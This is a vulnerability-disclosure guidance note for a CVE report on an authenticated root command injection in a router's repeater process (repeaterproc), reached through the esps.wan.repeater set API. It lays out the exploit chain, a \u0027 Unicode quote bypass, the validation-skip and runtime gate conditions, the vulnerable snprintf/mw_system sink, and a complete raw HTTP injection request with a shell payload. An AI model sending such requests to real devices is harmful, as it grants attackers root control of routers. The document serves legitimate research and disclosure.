# Conditional Root RCE via `esps.wan.repeater.set` -> `repeaterproc`

## Purpose

This note accompanies:

- `report/postauth_esps_wan_repeater_repeaterproc_rce_report.md`

Its job is to keep the final report positioned correctly: this is a real command injection in the repeater runtime, but it is conditional and state-machine gated.

## One-line conclusion

The real path is:

```text
/api/esps
  -> magic_link forwards object="esps.wan.repeater", method="set"
  -> /usr/libexec/rpcd/esps.wan.repeater writes my2P4key to /tmp/config/repeater_status
  -> repeaterproc reloads my2P4key during the 2.4G associated initialization path
  -> Repeater_SetMyparam() builds:
     ubus call esps.system changepasswd '{"newPass":"%s"}'
  -> mw_system() executes the attacker-broken shell template as root
```

Therefore this is:

- a product-specific authenticated command injection in repeater runtime logic

not:

- a raw ubus exposure like `file.exec`
- a direct `/api/esps` generic primitive like `service.add`
- or the same issue as `reload.reload_config`

## Key evidence to preserve in the formal report

### 1. Unicode single-quote bypass

The web-facing request filter is not enough because `\u0027` survives JSON decoding and becomes a real single quote in `my2P4key`.

That point matters because it explains why a request body that looks JSON-safe at the HTTP layer still reaches the shell sink with a true quote character.

### 2. Validation bypass condition

The report should keep the fact that validation can be skipped when:

- `periorradio == "2.4G"`
- `my2P4ssid == perior_ssid`

This shows why `my2P4key` is not merely user-controlled in theory, but practically controllable in the exploit path.

### 3. Internal field mapping

The report should state that `Repeater_GetMyparam()` places:

- `my2P4key` at `a1 + 48`

and that `Repeater_SetMyparam()` later uses the same field.

This is the bridge between the web request and the shell sink.

### 4. Runtime gate conditions

Do not oversell this as an unconditional immediate RCE.

Keep the explanation that the sink is reached only when the repeater state machine enters the associated 2.4G initialization branch. Important runtime indicators include:

- `Judge_Repeater_Enable()` selecting the initialization path
- `/tmp/config/connected`
- `wlan1-vxd` being treated as associated
- `rssi > 0`
- `online_time >= 6`

This actually strengthens the report because it makes the conditions explicit instead of sounding hand-wavy.

### 5. Actual sink

The decisive lines are the shell-template construction and execution:

```c
snprintf(buf, ..., "ubus call esps.system changepasswd '{\"newPass\":\"%s\"}'", key);
mw_system(buf);
```

The report should keep this front and center because this is the real vulnerability.

## How to explain the assisted bench validation

On a single-router lab bench there may be no real upstream AP available to make repeater association happen naturally.

That is why the PoC supports an assisted mode using an already available helper root shell. The assisted mode:

- prepares `/tmp/config/connected`
- provides associated status data for `wlan1-vxd`
- restarts `repeaterproc`
- allows the genuine vulnerable branch to execute

Important framing:

- this helper step is not the root cause
- it only reproduces the repeater runtime conditions on a constrained test bench
- in a real deployment, the same branch can be reached by genuine repeater association behavior

## Report-writing recommendations

### Recommended emphasis

Use wording such as:

> The issue is a distinct authenticated command injection in the repeater runtime. User-controlled repeater credentials are persisted by the web API and later reinterpreted inside a shell command template executed by `repeaterproc`.

### Recommended caution

Avoid wording that implies:

- the command fires immediately on every `set` request
- no runtime conditions are involved
- or the issue is simply another raw ubus exposure

### Recommended impact phrasing

Use:

- authenticated root command execution
- conditional but confirmed root RCE
- delayed execution through repeater state-machine processing

## Suggested manual validation flow

1. Log in and obtain a valid `AUTHENTICATION` session.
2. Prepare either:
   - a real upstream AP association scenario, or
   - the assisted bench state used by the PoC.
3. Send the raw `/api/esps` request with:
   - `object = esps.wan.repeater`
   - `method = set`
   - `my2P4key = x\u0027;<payload>;#`
4. Confirm marker execution or a spawned root shell.
5. Restore any modified repeater or wireless state after testing.

## BurpSuite request portion

The HTTP part that must remain raw is:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <SESSION>

[{"id":1,"object":"esps.wan.repeater","method":"set","param":{"list":[{"intf":"WAN1","workMode":"repeater","periorssid":"same-ssid","periorkey":"upstreampass","periorradio":"2.4G","periorencrypt":"psk2+ccmp","my2P4ssid":"same-ssid","my2P4key":"x\u0027;echo REPEATER_KEY_OK >/tmp/repeater_key_marker;#","my5Gssid":"dummy5g","my5Gkey":"DummyPass9!","status":"enable","ip":"192.168.8.2","submask":"255.255.255.0","gwIp":"192.168.8.1"}]}}]
```

Why raw matters:

- if a tool re-encodes the body differently, you may lose the exact `\u0027` sequence needed for the stored real single quote

## README alignment

This directory should look like the other `final/cve` entries:

- `README.md`
- `report/postauth_esps_wan_repeater_repeaterproc_rce_report.md`
- `report/postauth_esps_wan_repeater_repeaterproc_rce_analysis_guidance.md`
- `poc/postauth_esps_wan_repeater_repeaterproc_rce.py`

Classification sentence for the README:

> This issue is classified as CVE because it is a distinct authenticated command injection in the repeater runtime, triggered by web-supplied configuration input and resulting in root command execution when the device enters the vulnerable repeater branch.
